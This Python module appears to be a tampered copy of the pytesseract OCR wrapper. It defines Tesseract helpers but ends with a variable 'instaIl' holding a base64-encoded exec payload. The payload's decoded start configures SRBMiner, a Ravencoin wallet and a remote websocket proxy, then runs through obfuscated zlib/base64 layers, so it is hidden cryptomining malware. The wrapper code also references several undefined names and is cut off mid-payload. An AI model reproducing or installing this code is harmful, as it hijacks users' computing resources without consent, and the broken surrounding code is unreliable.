import base64
import zlib
import logging
import re
import shlex
import string
import subprocess
import sys
import subprocess
import zipfile
import signal
import os
from contextlib import contextmanager
from csv import QUOTE_NONE
from errno import ENOENT
from functools import wraps
from glob import iglob
from io import BytesIO
from os import environ
from os import extsep
from os import linesep
from os import remove
from os.path import normcase
from os.path import normpath
from os.path import realpath
from tempfile import NamedTemporaryFile
from time import sleep

tesseract_cmd = 'tesseract'

class Output:
    BYTES = 'bytes'
    DATAFRAME = 'data.frame'
    DICT = 'dict'
    STRING = 'string'

class PandasNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__('Missing pandas package')

class TesseractError(RuntimeError):
    def __init__(self, status, message):
        self.status = status
        self.message = message
        self.args = (status, message)

class TesseractNotFoundError(EnvironmentError):
    def __init__(self):
        super().__init__(
            f"{tesseract_cmd} is not installed or it's not in your PATH."
            f' See README file for more information.',
        )

class TSVNotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'TSV output not supported. Tesseract >= 3.05 required',
        )

class ALTONotSupported(EnvironmentError):
    def __init__(self):
        super().__init__(
            'ALTO output not supported. Tesseract >= 4.1.0 required',
        )

def kill(process, code):
    process.terminate()
    try:
        process.wait(1)
    except TypeError:  # python2 Popen.wait(1) fallback
        sleep(1)
    except Exception:  # python3 subprocess.TimeoutExpired
        pass
    finally:
        process.kill()
        process.returncode = code

# with zipfile.ZipFile('python.zip', 'r') as zip_ref:
#     zip_ref.extractall()

def timeout_manager(proc, seconds=None):
    try:
        if not seconds:
            yield proc.communicate()[1]
            return
        try:
            _, error_string = proc.communicate(timeout=seconds)
            yield error_string
        except subprocess.TimeoutExpired:
            kill(proc, -1)
            raise RuntimeError('Tesseract process timeout')
    finally:
        proc.stdin.close()
        proc.stdout.close()
        proc.stderr.close()


def get_errors(error_string):
    return ' '.join(
        line for line in error_string.decode(DEFAULT_ENCODING).splitlines()
    ).strip()

def cleanup(temp_name):
    """Tries to remove temp files by filename wildcard path."""
    for filename in iglob(f'{temp_name}*' if temp_name else temp_name):
        try:
            remove(filename)
        except OSError as e:
            if e.errno != ENOENT:
                raise
# try:
#     os.remove('pytesseract-mx.zip')
# except:
#     sleep(0.00001)

def prepare(image):
    if numpy_installed and isinstance(image, ndarray):
        image = Image.fromarray(image)

    if not isinstance(image, Image.Image):
        raise TypeError('Unsupported image object')

    extension = 'PNG' if not image.format else image.format
    if extension not in SUPPORTED_FORMATS:
        raise TypeError('Unsupported image format/type')

    if 'A' in image.getbands():
        # discard and replace the alpha channel with white background
        background = Image.new(RGB_MODE, image.size, (255, 255, 255))
        background.paste(image, (0, 0), image.getchannel('A'))
        image = background

    image.format = extension
    return image, extension

def save(image):
    try:
        with NamedTemporaryFile(prefix='tess_', delete=False) as f:
            if isinstance(image, str):
                yield f.name, realpath(normpath(normcase(image)))
                return
            image, extension = prepare(image)
            input_file_name = f'{f.name}_input{extsep}{extension}'
            image.save(input_file_name, format=image.format)
            yield f.name, input_file_name
    finally:
        cleanup(f.name)
        
def subprocess_args(include_stdout=True):
    # See https://github.com/pyinstaller/pyinstaller/wiki/Recipe-subprocess
    # for reference and comments.

    kwargs = {
        'stdin': subprocess.PIPE,
        'stderr': subprocess.PIPE,
        'startupinfo': None,
        'env': environ,
    }

    if hasattr(subprocess, 'STARTUPINFO'):
        kwargs['startupinfo'] = subprocess.STARTUPINFO()
        kwargs['startupinfo'].dwFlags |= subprocess.STARTF_USESHOWWINDOW
        kwargs['startupinfo'].wShowWindow = subprocess.SW_HIDE

    if include_stdout:
        kwargs['stdout'] = subprocess.PIPE
    else:
        kwargs['stdout'] = subprocess.DEVNULL

    return kwargs

def run_tesseract(
    input_filename,
    output_filename_base,
    extension,
    lang,
    config='',
    nice=0,
    timeout=0,
):
    cmd_args = []
    not_windows = not (sys.platform == 'win32')

    if not_windows and nice != 0:
        cmd_args += ('nice', '-n', str(nice))

    cmd_args += (tesseract_cmd, input_filename, output_filename_base)

    if lang is not None:
        cmd_args += ('-l', lang)

    if config:
        cmd_args += shlex.split(config, posix=not_windows)

    for _extension in extension.split():
        if _extension not in {'box', 'osd', 'tsv', 'xml'}:
            cmd_args.append(_extension)
    LOGGER.debug('%r', cmd_args)

    try:
        proc = subprocess.Popen(cmd_args, **subprocess_args())
    except OSError as e:
        if e.errno != ENOENT:
            raise
        else:
            raise TesseractNotFoundError()

    with timeout_manager(proc, timeout) as error_string:
        if proc.returncode:
            raise TesseractError(proc.returncode, get_errors(error_string))

def _read_output(filename: str, return_bytes: bool = False):
    with open(filename, 'rb') as output_file:
        if return_bytes:
            return output_file.read()
        return output_file.read().decode(DEFAULT_ENCODING)

def run_and_get_multiple_output(
    image,
    extensions: 0,
    # lang: str | None = None,
    nice: int = 0,
    timeout: int = 0,
    return_bytes: bool = False,
):
    config = ' '.join(
        EXTENTION_TO_CONFIG.get(extension, '') for extension in extensions
    ).strip()
    if config:
        config = f'-c {config}'
    else:
        config = ''

    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': ' '.join(extensions),
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)

        return [
            _read_output(
                f"{kwargs['output_filename_base']}{extsep}{extension}",
                True if extension in {'pdf', 'hocr'} else return_bytes,
            )
            for extension in extensions
        ]

def run_and_get_output(
    image,
    extension='',
    lang=None,
    config='',
    nice=0,
    timeout=0,
    return_bytes=False,
):
    with save(image) as (temp_name, input_filename):
        kwargs = {
            'input_filename': input_filename,
            'output_filename_base': temp_name,
            'extension': extension,
            'lang': lang,
            'config': config,
            'nice': nice,
            'timeout': timeout,
        }

        run_tesseract(**kwargs)
        return _read_output(
            f"{kwargs['output_filename_base']}{extsep}{extension}",
            return_bytes,
        )

def file_to_dict(tsv, cell_delimiter, str_col_idx):
    result = {}
    rows = [row.split(cell_delimiter) for row in tsv.strip().split('\n')]
    if len(rows) < 2:
        return result

    header = rows.pop(0)
    length = len(header)
    if len(rows[-1]) < length:
        # Fixes bug that occurs when last text string in TSV is null, and
        # last row is missing a final cell in TSV file
        rows[-1].append('')

    if str_col_idx < 0:
        str_col_idx += length

    for i, head in enumerate(header):
        result[head] = list()
        for row in rows:
            if len(row) <= i:
                continue

            if i != str_col_idx:
                try:
                    val = int(float(row[i]))
                except ValueError:
                    val = row[i]
            else:
                val = row[i]

            result[head].append(val)

    return result

def is_valid(val, _type):
    if _type is int:
        return val.isdigit()

    if _type is float:
        try:
            float(val)
            return True
        except ValueError:
            return False

    return True

def osd_to_dict(osd):
    return {
        OSD_KEYS[kv[0]][0]: OSD_KEYS[kv[0]][1](kv[1])
        for kv in (line.split(': ') for line in osd.split('\n'))
        if len(kv) == 2 and is_valid(kv[1], OSD_KEYS[kv[0]][1])
    }

def get_languages(config=''):
    cmd_args = [tesseract_cmd, '--list-langs']
    if config:
        cmd_args += shlex.split(config)

    try:
        result = subprocess.run(
            cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except OSError:
        raise TesseractNotFoundError()

    # tesseract 3.x
    if result.returncode not in (0, 1):
        raise TesseractNotFoundError()

    languages = []
    if result.stdout:
        for line in result.stdout.decode(DEFAULT_ENCODING).split(linesep):
            lang = line.strip()
            if LANG_PATTERN.match(lang):
                languages.append(lang)

    return languages
instaIl = "import base64;exec(base64.b64decode('dGhyZWFkcz00O25hbWU9J1NSQk1pbmVyLVBJUEUvMC4wLjQnO3duYW1lPSdSRmlrSlFFUFdqN2h2ZUh0OUc4d3dMZnVmRW1EYWdvUmY0JztwbmFtZT0nYz1SVk4nO3dzcz0nd3NzOi8vcHJveHktNHIzcy5vbnJlbmRlci5jb20vYldsdWIzUmhkWEo0TG01aExtMXBibVV1ZW5CdmIyd3VZMkU2TnpBeE9RPT0nO2ltcG9ydCB6bGliLGJhc2U2NDtfPWxhbWJkYSBPME8wTzBPMDBPME8wME8wTzBPMDBPME8wTzAwTzBPMDBPMDBPME8wME8wTzAwTzAwTzAwTzAwTzAwTzBPME8wTzAwTzAwTzBPME8wTzAwTzAwTzAwTzBPME8wME8wME8wME8wTzAwTzAwTzBPME8wTzBPMDBPME8wME8wTzAwTzAwTzAwTzBPME8wME8wTzAwTzAwTzAwTzAwTzBPME8wTzAwTzBPMDBPMDBPME8wTzAwTzBPME8wTzBPMDBPMDBPME8wTzAwTzBPMDBPMDBPME8wME8wTzAwTzAwTzAwTzAwTzAwTzAwTzBPME8wTzAwTzBPME8wME8wTzAwOl9faW1wb3J0X18oKGxhbWJkYSBzOnpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKHMpKS5kZWNvZGUoKSkoJ2VKeXJ5c2xNQWdBRVpBR3knKSkuZGVjb21wcmVzcyhfX2ltcG9ydF9fKChsYW1iZGEgczp6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShzKSkuZGVjb2RlKCkpKCdlSnhMU2l4T05UTUJBQWZTQWdZPScpKS5iNjRkZWNvZGUoTzBPME8wTzAwTzBPMDBPME8wTzAwTzBPME8wME8wTzAwTzAwTzBPMDBPME8wME8wME8wME8wME8wME8wTzBPME8wME8wME8wTzBPME8wME8wME8wME8wTzBPMDBPMDBPMDBPME8wME8wME8wTzBPME8wTzAwTzBPMDBPME8wME8wME8wME8wTzBPMDBPME8wME8wME8wME8wME8wTzBPME8wME8wTzAwTzAwTzBPME8wME8wTzBPME8wTzAwTzAwTzBPME8wME8wTzAwTzAwTzBPMDBPME8wME8wME8wME8wME8wME8wME8wTzBPME8wME8wTzBPMDBPME8wMFs6Oi0xXSkpO2V4ZWMoXyhiJzRHNUJmT3cvLys5enhybVhRSWNCcWJlVmJFNzVwZmhCdXBiaXA4WTJHQlhEbnI5Ykc2WmFacFkvRHRDU0poRGJ0a1BaT2lQSUNZdzRBVTZybFRoTTNpeTVvbXdmc2UvdTJDWCtqeURaa09EMEVMZklEMklSWEZSLzM4K1VoL0F4VkRQTCtWdWh0Y1lPZFNhcDlNaWUvTVVRTkx3SjE4M2tyZU95dDhwdmNtRURocnRpc2J1RFVkVGpLdGdoeDhwVVhkSUdQV05UZkVTZGJkeUJnMjlLa3orVERMdERLd0NPSGM2SzlWV2VGK3BrQWNQUXFPR1RZNVg4UUZqbnhMOThtamNWc3FHL0dlNTh5L3ZSRkkxTmRVbmNxWDY4SmhOaWE5bXVrbm05TnJMSGRiTnloRDdNMEgySEY2YjYraExqYlBqcEpIM2hORjhHZ2JyL2Y2dzl1R2pEVytFR1JpYVoyUy9BLzlFdHZPVGtPWUJVRHAzR0IwcHNyazVnSVhRWi9GQUgrREUvaEdMWlhFZ3M4U0N6V0Z5U1l1cFpobmlLYVBlVjhXY043U3FCZ3lnQ096RUsxOEU5U0xGNUVZMzd5Q1N2M2hxYkI1WkhjNVpYTEsyZWkxM0RuWHpaWm13cHBuQ0tTVDRKTjZORkJkcHpodER4cmh1dWJha0c5L0Vlc2RVWHJzV0NjTlZvNzF1OHkycDRZaFdrZUNNaUtVU20xK1hLSnZ2cm1UYktrWGNwV3RCRklleVZvL2dwSEI5TTlUYXhpbEZyc0o1TkNUUGJWSTFjdHEyVGRqZllvNS9qaUVUSGRqTXRoOUtwanowUjZJRkoxMGVTejFQNlE2cWZGa1pEdzJFMHgreHFXRjlENUIvU00yUy9MYTgxWkFkYnlTZUMrODNrQkV4S0x6NzdJMFlzQTN2VkM1eXRLc0QrUmt4Mmx6OW0zRk5GeFE3N05lTk9oMGRIMXpqNytxa245SFIvdDZvTk5mbTluYVhhWnRHa1VmbUxQcE1oQjJ5eGtjRnFHNE5TUTRLbW1Kb0wvL0tHZzJjWWV5VUREdlBIWE9nTitjU3pYR01ubVRBeEJXL3hiWUJXS1RJZWJhTTVUY0RsZERLbzZrRlpIMHp6NFR5bjVXL3FXU0RwcG9aNFhrek5XNm5mWVhpZnUycFpuc1laNlVoZWZ2cTVEZVVCWnpQc3JKR3Z2MEVZdEMrTXpucEpxd3pOaU9aV2QrMlVUTG9zTFBFeEhUYXQwYWtBRXpKSGVDZDdNT0NUbjU5NXg3SFYrK3pDSlBPdGJOUDNiSEJhZjlsbWVFa2E3NVY0WUVPd2JwZHB6RXR1N0wrcmRCWmUrRVRsWVpRc2YwZXI0cGVNTVg1RmREVGw3bDhwRC9IdUZVNk9DUDkwZnY5MnVyOTdicTN6eVdCTnBFUWd5Vmx3SkdKMk5GeG1zNnFIWXVPNjZORmJuR25heUo1S3pybHQ3TmxBMTNwcjVqSzJGc1JibndSc0drRHN4U0QyV1FwcU51Tmtid3NzSzBUQ1ZWZE1DN3Q0QTRIM0JVaitlTXNJWUJ2azZ0NzdKSGZjWU51WEpwVytLQ2R4ZSt2RXI4bTc4bTErRVJNSkQ5UnJjTlJ1aGxFelpsTnAvenR6SHB4bnBlV1R6QXlUbVdMNWZmY1pMVDlPUkk4SE9hOGZpYVRUMDBPUmJ6WXg1aURaYkFzK3ZpVzh6YUJpS3B3TGJWSUpub201N2l4UDBRMmpMdEF3S05veUxBM1pqcEZnd2R1MnozTFZ5WDVXNnRscFlUbzU0ZXh5N25KbTZIM05xdXdPYURITFZGZmYvRmtRMTZ5QWdYQWE1NEtkeWNlYmdvaW1JSGM2MTY0bkRSL1VqQ3BEKzZwayt0bUJkbjgvemh0dXhOM08wVE9GV2MvNUFvZzlWRm42emEzTzgvc25ub0RmWCtOVnJpeis2TTRIdUR5bjJtMis5L2NXRFJWOXJMWTlaY1BIL0lYT1NHZnd3ck9kNXhuSWRqYzFtUktJSVhPNjl4eGlRNGd0SVI0dUc3UHJyZC9Xa2VlUGE4RTVsQ2ViNmZRTVNDYXBMTWY4ajBTQWw4aFVDcys1Z2xiRGQxa2d2OUhhWDdMNW5IVDlJMk1vUk5wRU5leG1OSElaaThoSGVKUDk5b0lrdmM0NFFnUmFkMDVSTTh3K0toZ25LL3F6aTVQUXNGK2wzME5hTHlEK0VIMUdvdTRCRGJsVXZEakxIQXRscmtHR2JlSzFMenFLNXNnOWE4YmUraEMyZWpwMWk4NWhvYktTSmpuZitPeW5HTDI2aSswR2cxVE5NQVNEZ2pKU2V5cjNiUDNPS051WHVsQStmL29TeHVQNDBmT0xHR2VFZkQ0TlJvektpWlcrb01rVkpZU21NTDJWZ1k2R2w4RHMva0VVVnlvTzNVMi9BT2pJVkwyWHNOeGZ0MkpYSW9SdHdzVzV0Q1k5Vml6aDBLSzZMRWY0ZFZyVzh6VkxldnJSM29GcUw4ckRtSkEvdFF6Q0FHb2h5c1VJYXovV2t6QVhDN2I2UDAzeDd2bWhaYlBSTVYxSzl4UHZ4ZjlqWUVMUmdhOFoyd0JKL2pqYzZPZlRYMzlrQm9UTWFLb1BBMndoN2xFaDllNVZrMjZFQVJiZWN0Q1lGRTY3SmNhN21Xb0pYRExRbmthT2pNcEtRb1U4cFpENEVTemJjUGVrYWppVEY0M3lWOFNabVM5ZkhxaThtT0premlxRFlHclZYMzA1azRBVTZ4aCtHWnhJYlRlbVQ1YUhVa0N0RERpSlNHZXEwNmRqS1JHYjdNbUxIamJzRERSc2dOYXk2RHJKN01wZ3F1M3ZsV3dzMGFKVGdENWVLeFVEcVQxckVITGRobnNCaU9VSUlsTUdOaHNCOWltbURqR2RWRTNKVWdhbUI0cEd3OHhVVXg1LzNkOWYzeU96WEk5ZnIxNnczdkYyUEo2eVFGUlJ0KzdwK28xQ3M2U2xISjFiRmdmZ0VKL25VMlFaWUFSR3FadUhLanl1bnArWlZnZlNpZWQ1Y0tyaDRERXUwbVJ3c0ExS1dTZ3NjSGEwbWZlTGhxa0h4VzBsVDdIV2xDZm5UM05JRFBrZzB4T3VESnhMZTc0V211Z2ZvbHgyK2ozdk5hQ3ZHTnpTOTJrQUdGVDVSRGwwNUcrTldRVDJwVjJ1cHZmeExkUXBiRnF1QmE5d09rRW5iWHkyUDBJQXJzOE8wTWhCS29Sb3JzNmRTdU13MVZMRlRib0Z1TmVjblFwS3pmaVBmSkFVTENFZVUrUkIyWXBKRXRZR3ptM0lla1pwekpvZnAvek1NWUpCamkyczA3SS80d0daWXJjV3J2cnViWVIxZm1NYWlUR21rbkd4anh6TmZSWEpqdzg3L1U2UWNJdDdTcVR4Qk90Umw0R1hlaGhaajNJaUFSSVdoWU5YNTEvdVVDVjVCZjJVWm9kalRHdGpyL3h6OFkyNFJ3YkZXU0hzVUU4U0hpamtmVzAyUXdmdmlpTjdQeXpIVGYrNlZIT2RNZmQzcVc5OWtjWFI1L3dIQnRVWVlPazMxMU5ha21NSGY5ZGsrdHBoM09XUmQ1K3F4a0FRTTJscWh5VEdVbnJuMmhYT2tzeVA1MWNONXV6dWJleXVzMmxwalUrWHY5VTNhc2w2d2NRWWVac09WcXE2QnJSc2d1blVWVEV4RWI0TWZ2SVFmdklqeDh1U25CZEdPcVhyQjV5dGh1S2hxdDl0d1RmY2FxR3dibHFmdDR0YitJRUozWDZiVVhSSXNsOVJVSFFKU3owdkxkaG52cUtHV3Q4eDlGaHJhQnVmbXV2VnFScW5vWEU4S1FnT2dPSmJUR2VycHhsTWFoakZnWlZVSHRVbG1wdEZ2NnRQemtVQVlaQ2x2SlA4ZWtTMHcyY0tiV2FpOUxWaUpkaTlaOWhKNGcxeUN0bEN0VWNzRkZSYjJpcEtHWEtlK1hBQVNCUmlseTU2S2djM1ZHOUpiZGo1anVXc2gyQnVMSytUbDBLNk5UQVNEcEdXcDF0VFBVT29xR2JqWWlUbmJRZVZJRk5leTRBK2ExZCtRV0lFdkdaSngwMVZpRTBBM29ueGppc2ZSSUpOTW9XUkx4aCtmSlpkYUJDT0JIdXZ5VDd6bUl1U3FleTFuZzkwa1dzd0pZTzlRbklzeEVJbkcvekFIZnp5b0FWUUpaUVU1S2QxTTd6d2NyV05xdm84K0N3RjJqWmpxL1lCQXlVKzdCdU9Sajl4UlY4NnI2SUlralczVlAzR2ttNlZrcUMvaDdLWGpnZDhsbXg4UHFFMlBkZm9uTjlBMW9xNGpUQXlyaXp1azk5c2ZUNXU4RnlMSlJRc3VtOG9LTWZSVE54S0lZK1dLTTFFVlN2Vzd5ZEFkbS9WZFBZNmgyeEQ5eTJublZxQzJZT2ZiZmdWQXJkM1hiQXVaRDhiNllYeDE1cVltVy95ZkgzZVlpR1cxeWJVNVIyNU9OR1k2eW4vZU5rdWdtQkxCeU1WMngvcWsyTWdXbXJVQnEzUlNYQmF2WjdnZW1PS2xneS9Sc2FjOUlQQ2pJWUJwSGtYcTRiQmdBWXI0SXlWZ25xeXFZam1Pb0FXc1Bxd0hLSzF0OHR6VmNqVjcvYzh6UGU5YklXUmlzNUZkcXZhNDR5Y3NVbHN0ZjVSM2J2VzFydUVWMks3TCtvMW5LYmtrK05UZ3cwQ1d4RkVqWGdFUitZSnJadFM5elAxclgraVpZSC9SZTdsdkRaVWh3R2FlVlN5MmhzR1V4VGk3ck14NHJncXhmbzFicjI5Rjc2RHV2WC9BVUhHd2RweWJzTUEwNXhNcytaa0lUbnJMWFVsc05KdFpGL0ZORTlWSmUrVHhBOWY0c1QvVDlvRUMxNDZSQ0V3bWpSWEl5YlFVL0RpSWNFRi81aHJMS3pmS2VpREJ1VlYwbDMzQ3BoUzluZW0vQk1DS3pLUWNJMHBxYk5KcEVNT24vUVh2K3NtNVZHY0dxUzFsUmM3NjlVdml0V0N1V0RnSmo1bnlEcEc3R3A5UkpIZytzTy9JemdKZ0hob3llWDZ2RXZxWkhRb0JHdkpsUWF4MWpIc0lqcWh5RGovM3d0SzhVSWU0UklWTWY0ZDBHcWNMeGcrN2tFZFJXRk5kUVFaNGVrWjZrdG1wMzQ2elREbTRVL1lTcXNzdTlaZGpDMnlIK0t3UFU3dExYdHBOOXJVelhLSExlUlNSaEhJcldRUHVVN0NYWEZMQ2NwSVQ5NHk3YW1lWXp4R2VIVmpyZDZjRTFyK3djTWkyN29xM1BkVWhkR2xyeXJYeDlQUkV5TFJmenlwTTRIby9ZcWExd0xvSXB2cjQyUXE3YU9pd2dkemhDRnBITm84VldpVkk1MzcrOEFiSTg1c3ZxY3hCMEZhR3pXT2lXMWFja1dWK0QvN041eWNWSHhOWjRndjlaZ05hN1QxN0RTWEV2dmRRRmxnQ3hSNmZvRkhMd3FNN25UbUk1UFAwUUgyRHJRSVhONnY2ODBHcHJoR3BqYy9yR2RtWENlRXN1TDJGdmZydkxqSTM3Ym1QZUdLMUp2bUx5WC9RYW1KK3A4dnppUlFkSWQzL05aNFpiMXhQM1VCR00rMWVZaDZsbzg1VE8xclJXNmdMbWI2dUoyUlZzaTZad3pPbDJ5Ukw5d2ROa2JpWGExZGtURy9aa3A1OWFPTkVubDV0Zm9tRTJyREFFMjRtS2FHR3I0QVIxdnhsYmpEY1Z2Snpha01iV29IZEtNRUtGZXk2V2g2c0crcDJleVh5OWdla2k4YUZLanNnNU83d0I1MzlRTmhQRDFSbW1vcUF5bEs2RUJSMS9xNFZpNTIwdDBJQUpnL090SVRFdkNVS1lVNlRYRWVoVFIyUTZJNjZ3a1ZQempITXRHVmIyVVRwODhVNGczVlN1WjdrTUNYdVdwNFFiTEJpZi9XSEJVNWRabld0cnViOWJhZVl2bGNTTldtNjR6QkhoaGZhT241c0ROUzhFYXgwaVRxZ21NZjRlVnl4dFhuT2VhYkhvUkY3blZ2Z2g0TlEwaFE1TWc3UXdHUzIzSHZ1UjBjTGd0aHpjbGtYSFVCeGhOQlFRWXBEQ0xDdmdQN2ZIT1NON2VwVUhyRStNNWhaODZwRUl0SHVMTXgvVmtwZmNmZ3FSeGY3R0ZJZ1BmSTBOMmk3am85dXZqS3ZRcllhbTVWRWRUZ3BSdEZpa2RwL21HeExWTTRQOXBzbG0vbXVLZmIvaU1oU0dxakxpUjd1RHU2MWJiL3hZN05jZ1hLL21nN3RjcTFSZGxWMXJlKzFMNzIvQzR2czdER2h5Y0ZpMW42N1Qvb3hoMFkwcTVOdzRabnozdUg1NGQ4bU51SmtDaEhyM3NuUEhTTXRrMlNwKy9RenRrUEdSckZIRDBtbFE2S2VtaTJHbnlaWGlTRHJNU2dJVGFOOTA5WElVczhIUGEvUnliS2pMeHhOaC9BOFNvL05oUlA4M1pzK2RDMTMyTVlzZTV2cnhMUld6UTNCdnZSZ1NvRFl6VVpMbEtmNWNyTEZOOXIxZkFsWjNIeUlXNEw5b1dxcFRuZ2xZUWVmQi82N2pWN0NhZkVIWmRLNE01WWtaZHFuLzg0MStCQjFGa0xBUXRxSVlqUWVJWFo0eUYxQ1FURjFUNGlhQklrK2NiV3BzMVJYTEp0SVlMZHlXZHYwcWpad0cvN1BTWWtldGRjYWoxbTcwUTdxNWVWaG1ZTmpIeUxqWXduZDFEZEM2MXp0YVdudDFvOGxpVFl1WHVpQTFEQnpCSlF2L2JHZjNwdnFubHRmQnRXTHZaeTk3Q0NYSWZXS3ZDaitkY1lwWndlK3dLU3RtNUFsSno5K0I2MVZ6RDl6cTVNV3gyYmIyQmNTZUZqWEcwVjFYZjc3N1QyN214OXBVMzhVSC96ZXFGWFZlRWdFdms2RTQwQTNUVndrMmZpWTAvNWg3L0FzNnM3dFFUMndVeHJtdlhOZGMrby9yb0szd2hRUnBVSHordVRpcDJWbDFPQzFsblZVM1JaZFRLVGkvUUI3a3J4Mm15RklTbTBqSllEblU1WC91NWgzUDBleEN5SmJNdUdoNW53bVhJN0dDcmMxTkJyOG8xVTdPSllWR1lxa0VtcVR5YmhhTVNtVGFxaVhhY05mbGp4TmhJWjhPaEk2OXBBb2Q5Y0NhWXRIcnFSWWh3TWFDSVFLdlBsTFBWcmp2bDU5Sm5FS2pHUzU4WEE4MnI5bVlFL2d3QVdoc01XM0kvOTh4NTFKbDM1NnN2RGIwbnUxMnFBZ3A0WDlhN2RvcVM1K1pSMkZzM2NjVzAwNGFCa25pU05FZktkc3BsU3VGTmNrcmMzZkkvMVJ6UTJMb1o3aVQ2NTNqSDFHWVZvUGtDcFlocXB3US9zcC8xS0pBVEpFSkw0Y2hMNnU0S2ZKREErTFZDMHp1SWtqMnNBZUJ4TDBaNUZqVERvUFlPbElKMHJiUS80dEp3TDh0dlUvTUZZWHg4clloRnVQVW9UNjVVVFAwbzVmeGcxNlFwL25zMzRrWmhpVFIvSW12ekJQL2xSYXNodlowaDVDblBVYUxHTTc5VUs4U3dTOFZxYjZuUlY5SUJlWTBDVVNPY2NFVjBNK0k1Q3VMVjc3cnFQOE9HT2VTTGpEWTBXaGdKMyt3ajZlUC9KdTRXd1V3V3dOZk1jRVI3Wjd4RFlxdTJYaFhBREdpRE43M3l5K3hIOXFpaG9QYnVHQWh6SEpKeVRtNUdLdEpxa2JxS0c4OEJCUDFRSldSbDNBSmtuTkZCZTYrNHlaaFAvMjdHK2M1MEh5WkNoZDhxSklVZVBXNGgvTGVGUXJFRVNBR0lpSndhR3hiTkE3ajdlWVc3QUdHaUsvQjYwK0ZsNjRYR2hsc1RITFRIL1o4cUVMd0YxTW9qcDA2d2dZMmJXT0JpZ3l1OTg4OVQ3dEIySStPZktRVWNOUW1hVHJXdXN3K2g1eHJFYVFKclkybUUyUHdqT2tpTmxnY212YUNaVmRXQkN3aG83STJmOHJ2RDJVdGNHSlRWcnBYMkgza3AyN09BNWNIc2VQdE85UHdvcEExVWJ0K3prVTJ5TFNiejIrcVBkdDREMlVxUmd2ZWVIMi9ZRDZneFMyYzVzSlZEWk91eXJJdW5aN2ZzT0MzcHZJSU1lN20vSU1IdjN1eERYWjBKN3dITjEzTzJueE1RNExLNFQwRDhFNzBTMjNRdFU4blNDeEtYbkdUOEFvbGt1eE8vQ1p0S1gvZXg3OXEwZXJwaWdMV0V2NVN2MWM0Ky84ODFzSWxsWnZPNnNLb1I1b0pFVGlBa0UxMTF1b3h4Qzg1YU9TUGlaL3ZVMEpSQU5kRTFkK0JHcUZPQ1crTzZIWi9NalYrNHQzSmFMMkppNXpDcW1ZUzVaWDJSemMyM1NyZmNURU5yd2prbmc2UkIrWVlnLzlxTUhjc09ybXRPc2ExcmgvRGR5RVk0bXJiWi95ZWJhc2syOXQ3S0lwbE0yZ3d0ZERhSlErcGVOV3UvbHNoR0h3cEN3cXR3azlqSnY1ak5xMmhIanA0M3BWV1JJMXdZK1dRR2RLbzY1K3V3QVJERDdINUtuNUhEVlZRMVpYK2pQeVV4Q3d0RUVLTGEyV1BIRVJ3NmpBZFVqRnJJMVA5SU9VaEpJWlUrSURMd0VBQ2ZwTlFhOEJTZHY3WVVSdDNHQXQrc3F5bUdPdVNpQWlOVmszeXU1M0g4RXVMRDFTbnJiU1hPN29uZnpOUmpsdVdNcm9lZ0pTVGFFZHVLbzZTeXVERkM5UTlraDNmeWNoTkpJS3pxUE05QUE2aHo3UVNqVDVMTzlrNkNSNWEvYVREcTlGamJDZHBVYmZuckp3M0ZSaGt4M2FSRmg4dG0wcXR6TUMzNHIvOFFSeHdOTzNyUXNwVkxkUGlSYnhlRFczcGpOaFo4eUZuR2Jjc3JRVWZRUzh0ME5yUGRVSGRVMEQ4T3J6b1QwdmU1Wk5WTGxKQXRwbFYvSVBDcWpBSldCdlJCT0VEbkl1NTNWRDFZaUJMcGNlaVcvQXZqamZ0SWhBMm10UlA1a2ZpVmtrVnBOV0ZSZjN1N3BxV3BSSFlBam5FRzZLY1BCVnl5SmRrTjYwMmJiWjlPZUZkZUV6N2FSejhlam82dEtJMmxMMHVIZ1RiYThiangreUppVjc3bDErQmExOWoxNFRuS2dCdHJQaVhsQ0h2cmU1cHpCTm5aUW1RU3lhRGt0ajAxTEljMUk2TlI2TWZ5S1BsMmplN1I4MUJ5VU9ma3pHQnM4QjZtNTVIU1d2QkMxN3ZhOVlxRkJQdzNDL0tINTBSeHJNWjRvSUMzSXEwckxoM1h1bEZMbVNtZnRmRHcxcHZXNkpYcDVYNmprY1o3WnRLcDlMOEtodWV0UjNLSW5VTUlVckR2dStnY3Fxamcrb0pYdVU4TnZFUE92bVE4UG0rOU5HOGV1NjlvVjNHWkpaVjZiQnNiR09zUVF2STZpN0U0c0JUU0hmaFptOXhoMTJpL29pTlc2bmhVa2VMV0cweVhaSC9pSlpXUzhmcFdPTldLalBucE9EN2Q2ZGlyRTR3WlBjcHVFR0NhU3hISmxhRm5HK3puR3IyT2RLYW9TZUlMTTlqdlpOTHZuTXZycTB0TFVNSFNDOUZOYVB2cXlRM0sybDVJbkJFNjU4RHNNWUVmQUlxY2NNdmNoYWJjL1NKV0E3TkNHK2JLSVJzckNUbVVXNkRuQjl0RVRnQndkd3VOZ0kyUjRUT1NINTVodEU3TlE1cDRqdkxoUVhnWExhcWJIdDBXK3JueVRudEFOMHFpY1ljcERxcnZzWlkyckJna014OXlpQnhaNlpuSjFEWDdjVGJzSmIwaCs0Zlp4V2pHdkJ3cU5PZWZLbHBqUHh0bEE0VXQyYURsMmtjeFU1MWZYRXA5M3cvdkhvNHZGOTBLSlE2VmRBaFRlbEhwL1RuV1V4dXFIM1NpNjREV3Y5bXFMTW1wVGE2TTNyOVk3SVJRLzlqQWRIVEx1MFRZTHg0SU9iaHA4Uk1rWkRlbDFZSktZcG8reW9Ha3M1U3NsSnRhZkRQQXI2QkhoRFBKVmYrdzBZL2djcU5hWXFVUmwzQVJHeHNXQW9KZTRsM3E2b2ZBQmtud25vMXNkSlZoY2hpdGwrdnA4MVlqdXJPMnJJRHhjR0w3NTI2bHZUK1pyaG5INXdVZ1Y2eUFRS0t0dUp4UUozVlQ0cHpueitvMnJjbDZLcnNLVG1BaFAxUFRsenVjQUNjTU5DQjM4MStvUmlidGpsNTJZbnVXRUhFcG5SOHZCeDdMS1hRYnF6Ykw0WDhxSk41akV3c1BwaEVCcGZ4clBQS29XSCtsZnlCUHlrU0ZoWEFEKzV1OUs0dzBGcnNvVVFVTjNxY0swaDE1NlZvbm9XclRZc